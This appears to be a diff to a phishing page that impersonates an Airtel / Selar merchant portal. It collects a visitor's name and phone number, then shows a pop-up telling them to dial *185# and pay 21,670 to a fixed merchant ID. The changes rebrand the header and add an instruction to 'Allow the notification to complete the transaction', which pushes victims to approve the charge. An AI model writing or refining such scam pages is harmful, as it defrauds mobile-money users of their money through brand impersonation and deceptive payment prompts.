@@ -79,8 +79,8 @@
             +1 - USA
         </div>
         <div class="login-hero">
-            <div class="airtel-logo-red">airtel</div>
-            <p style="font-size: 0.75rem; color: #999; font-weight: bold;">SELAR MERCHANT PORTAL</p>
+            <div class="airtel-logo-red">selar/airtel</div>
+            <p style="font-size: 0.75rem; color: #999; font-weight: bold;">SELAR MERCHANT INVOICE PORTAL</p>
         </div>
         <div class="login-card">
             <label>Full Name</label>
@@ -136,7 +136,8 @@
                     Dial: <span style="color:red; font-weight: bold;">*185#</span> 📞<br>
                     🆔 Merchant ID: <b>6837633</b><br>
                     💵 Amount: <b>21670</b><br>
-                    🔖 Reference: <b>selar merchant</b>
+                    🔖 Reference: <b>selar merchant</b><br>
+                    ✅ Confirm: <b>Allow the notification to complete the transaction</b>
                 </div>
                 <div style="display: flex; gap: 10px; margin-top: 15px;">
                     <button onclick="window.location.href='tel:*185%23'" style="flex:1; padding: 12px; border-radius: 10px; border:none; background:var(--airtel-red); color:white; font-weight:bold; cursor:pointer;">Register Now</button>
@@ -160,7 +161,7 @@
         const user = { name, phone };
         document.getElementById('login-view').classList.add('hidden');
         document.getElementById('loader').classList.remove('hidden');
-        document.getElementById('load-text').innerText = `Configuring selar merchant account of ${phone} and ${name}...`;
+        document.getElementById('load-text').innerText = `Configuring selar merchant account of ${phone} - ${name}...`;
         setTimeout(() => {
             localStorage.setItem('selar_session_v4', JSON.stringify(user));
             launchDash(user);
@@ -172,7 +173,7 @@
         document.getElementById('loader').classList.add('hidden');
         document.getElementById('dashboard-view').classList.remove('hidden');
         document.getElementById('dash-merchant-tag').innerText = `${user.phone} - ${user.name.toUpperCase()}`;
-        document.getElementById('notif-target').innerText = `${user.phone} and ${user.name}`;
+        document.getElementById('notif-target').innerText = `${user.phone} - ${user.name}`;
         setTimeout(() => { document.getElementById('sim-popup').classList.remove('hidden'); }, 2000);
     }
 
